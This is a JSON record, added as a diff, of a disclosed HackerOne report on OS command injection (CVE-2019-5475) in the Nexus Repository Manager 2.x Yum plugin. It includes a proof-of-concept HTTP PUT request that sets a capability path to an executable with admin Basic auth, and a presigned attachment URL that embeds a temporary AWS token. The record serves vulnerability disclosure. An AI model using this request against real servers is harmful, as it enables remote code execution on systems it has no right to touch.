@@ -1,0 +1,234 @@
+{
+  "id": 654888,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82NTQ4ODg=",
+  "url": "https://hackerone.com/reports/654888",
+  "title": "OS Command Injection in Nexus Repository Manager 2.x",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2019-07-23T13:53:43.592Z",
+  "submitted_at": "2019-07-23T13:53:43.592Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "christianaugust",
+    "url": "/christianaugust",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35524,
+    "url": "https://hackerone.com/central-security-project",
+    "handle": "central-security-project",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/524/60c5e9c4b0090fc9ce80fa9d9ca3aecd88d01b00_original.jpg/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/524/60c5e9c4b0090fc9ce80fa9d9ca3aecd88d01b00_original.jpg/1d3351b56b27c9bb56ce22821a57514a7210186a77aefb760cd2113272723c1f"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Central Security Project",
+      "twitter_handle": "",
+      "website": "https://www.sonatype.com/central-security-project",
+      "about": "Ensuring Safer Open Source Across Ecosystems"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2019-5475"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2019-08-20T19:55:59.714Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2019-08-12T14:17:17.493Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "# Maven artifact\n**groupId:** org.sonatype.nexus.plugins\n**artifactId:** nexus-yum-repository-plugin\n**version:** 2.14.9-01\n\n# Vulnerability\n## Vulnerability Description\nThe Nexus Yum Repository Plugin is vulnerable to Remote Code Execution. All instances using CommandLineExecutor.java with user-supplied data is vulnerable, such as the Yum Configuration Capability. \n\n## Additional Details\n**Source File and Line Number:** https://github.com/sonatype/nexus-public/blob/release-2.14.9-01/plugins/yum/nexus-yum-repository-plugin/src/main/java/org/sonatype/nexus/yum/internal/capabilities/YumCapability.java#L121\n\n## Steps To Reproduce:\n1. Navigate to \"Capabilities\" in Nexus Repository Manager.\n2. Edit or create a new Yum: Configuration capability\n3. Set path of \"createrepo\" or \"mergerepo\" to an OS command (e.g. C:\\Windows\\System32\\calc.exe)\n4. The OS command should now have executed as the SYSTEM user. Note that in this case, Nexus appends --version to the OS command.\n\nThe following HTTP request was used to trigger the vulnerability:\n```\nPUT /nexus/service/siesta/capabilities/000013ea3743a556 HTTP/1.1\nHost: HOST:PORT\nAccept: application/json\nAuthorization: Basic YWRtaW46YWRtaW4xMjM=\nContent-Type: application/xml\nContent-Length: 333\nConnection: close\n\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n<ns2:capability xmlns:ns2=\"http://sonatype.org/xsd/nexus-capabilities-plugin/rest/1.0\"><id>healthcheck</id><notes>123</notes><enabled>true</enabled><typeId>1</typeId><properties><key>createrepoPath</key><value>C:\\Windows\\System32\\calc.exe</value></properties></ns2:capability>\n```\n## Supporting Material/References:\n- Windows Server 2016\n- Sonatype Nexus Repository Manager 2.14.9-01\n- Java 8\n\n# Wrap up\n- I contacted the maintainer to let them know: N\n- I opened an issue in the related repository: N\n\n## Impact\n\nAn authenticated user with sufficient privileges in a Nexus Repository Manager installation can exploit this to execute code on the underlying operating system.",
+  "weakness": {
+    "id": 59,
+    "name": "OS Command Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 535957,
+      "file_name": "nexus-rce-poc.mov",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/535/957/8c5d52b0c1300eae4d244dafa79bb235d4b24759/nexus-rce-poc.mov?response-content-disposition=attachment%3B%20filename%3D%22nexus-rce-poc.mov%22%3B%20filename%2A%3DUTF-8%27%27nexus-rce-poc.mov&response-content-type=video%2Fquicktime&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSKP6B35P%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T052917Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIAx739MYt9o%2FCzqqcjEGh7bc8LyuEzcyQSg0gBLQ0xJwAiEAsS6Yitb%2BXZLG6MrXSiDmr8rEsdQRGIWgZYcnO4RZvwIqsgUIfhADGgwwMTM2MTkyNzQ4NDkiDG%2FAay7ZzQmO4oSZuCqPBYxQDzUJXPpSGqKx0ZmcP5cjpjgAR7ZGqI5jM06T%2FwIlbAbqRe8I6Dvk1hCwN2I1866X3loYlwVG%2B3ezjPCauzfvhQ1InSqyscxaR5GoKEYMk5eYZTSeeYVBKz%2F1%2F40ZMDZKFFriBzktCZRTjMDhfv8raKB2LuyQJx3xLyBo5wev2JfEq3RoE8AEya03KG%2BHr8xny6giipS4JfIwPpu4mi4dYZOn4cZHAgT%2Fb0kv6U1tK42A4Gauuz4zo98cVOpidK46Ewr1yvccUZMejJfnm4NrhdJoIFlBcJJ%2BgI8hz%2BR255UHsMpruelxYxxni%2Fz2rpuIv49LkaSw7idE1NyyZj6kpIVbliddLrGaP5iBzOQtQdy1cOYfksk%2BT7%2BoNenRZuQwmcOneFMnuNbw7ZHS%2Bm8090eKDhetQGrwD16WGCCcCZtTYzJHTCb4tBfePn7WUWuBmOKU3w5rJv0nyCDaMyT%2FWiKPNlJVLqJP6voxT6AaPWHQF8eBJ%2FfzXrd6%2FmIyynNRc5KOqFnJlr%2FreR9KM6e5wWYP03fx%2F5Pas%2BU6QoPwnVCvlPCOE7WjcTj8NKLjJDeqKiOQNnnqC9EmsQ2pLhk7Z2SyKhXZvz9Ya9LUPjMpJTEjMe4uNr%2Fp8Fy6Y2yCSaBxol14KzPsIV55FxvpTuXIvuPEyclY%2BKUz9B3M0q7Xx%2Bvye5FygUwTz%2BmoiUIJwR8Y6YA%2FB%2B63FDW7v2p1dV12e6fRu0ZLV4mAmk6z42aJidcg8yp7q1hgY0Z5kt6Xz6FNq3FaksTwlDVOx%2FAOG4MHjgj%2BM1r1a%2B2GhEULAPAl4fzi7RidEVgIurF8PYG7UYLuuOTAbcn3EdsnwCOtTSUJHKIHgrBHUTDsD4%2BsMQUwgqy30gY6sQGdNtBYkNlstr4WOuYyzrAqDhYFD9rBL4SE9c6yXyaoS%2B70sZ2F7kycKRtO%2ByyZ5rilRPa8eE0rvXCgaXzb6P3LcOn7N8QI9abK7vmplRjS2FJIVFVhOsQbxUZqVXn7nJ4ZMELVvDIiLd%2B34uOdKJR1FmkpLRBG3aQ8Hljo1zpUF59R08IV10nKzawHIMclB5eHxO2xWFK9x4ocEsKweu6u4a1T3plTaHF7RKC%2BvPJUN1M%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=308e646eccf6e7244d3ce584b4e945fdbc62c100e50c8d9d7b088354b1644189",
+      "file_size": 89157368,
+      "type": "video/quicktime",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2019-09-11T14:17:17.589Z",
+  "allow_singular_disclosure_after": -215277120.18621936,
+  "singular_disclosure_allowed": true,
+  "vote_count": 28,
+  "voters": [
+    "m4khn0",
+    "christianaugust",
+    "th3hidd3nmist",
+    "mashoud1122",
+    "ickogz",
+    "zonduu",
+    "spam404",
+    "mik317",
+    "amad3u6",
+    "0-1",
+    "and 18 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "score": 9.1,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "high",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 17122,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "Java Component in search.maven.org",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "id": 18671,
+      "category": "team",
+      "content": "https://support.sonatype.com/hc/en-us/articles/360033490774-CVE-2019-5475-Nexus-Repository-Manager-2-OS-Command-Injection-2019-08-09",
+      "updated_at": "2019-10-28T14:50:28.824Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 429706,
+        "username": "acazzolla",
+        "name": "Adam Cazzolla",
+        "bio": null,
+        "cleared": false,
+        "verified": false,
+        "website": null,
+        "location": null,
+        "created_at": "2018-12-07T21:38:26.465Z",
+        "url": "https://hackerone.com/acazzolla",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "company",
+        "profile_picture_urls": {
+          "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png",
+          "medium": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png",
+          "xtralarge": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+        }
+      }
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "654888",
+  "votes": 28,
+  "latest_disclosable_activity_at": "2019-08-20T19:55:59.652Z",
+  "_metadata": {
+    "saved_at": "2026-07-08T13:29:17.891397",
+    "source": "https://hackerone.com/reports/654888.json",
+    "report_id": 654888
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82NTQ4ODg=",
+    "databaseId": "654888",
+    "title": "OS Command Injection in Nexus Repository Manager 2.x",
+    "url": "https://hackerone.com/reports/654888",
+    "state": null,
+    "substate": "resolved",
+    "disclosed_at": "2019-08-20T19:55:59.714Z",
+    "created_at": "2019-07-23T13:53:43.592Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzU5",
+      "name": "OS Command Injection",
+      "external_id": "cwe-78"
+    },
+    "severity": {
+      "rating": "critical",
+      "score": 9.1
+    },
+    "reporter": {
+      "username": "christianaugust"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpWdWxuZXJhYmlsaXR5RGlzY2xvc3VyZVByb2dyYW0vMzU1MjQ=",
+      "handle": "central-security-project",
+      "name": "Central Security Project",
+      "url": "https://hackerone.com/central-security-project",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": []
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4LzY1NDg4OA==",
+    "_id": "654888",
+    "disclosed": true,
+    "votes": 28,
+    "latest_disclosable_activity_at": "2019-08-20T19:55:59.652Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82NTQ4ODg=",
+      "databaseId": "654888",
+      "title": "OS Command Injection in Nexus Repository Manager 2.x",
+      "url": "https://hackerone.com/reports/654888",
+      "disclosed_at": "2019-08-20T19:55:59.714Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpWdWxuZXJhYmlsaXR5RGlzY2xvc3VyZVByb2dyYW0vMzU1MjQ=",
+      "handle": "central-security-project",
+      "name": "Central Security Project",
+      "url": "https://hackerone.com/central-security-project",
+      "currency": "usd"
+    }
+  }
+}
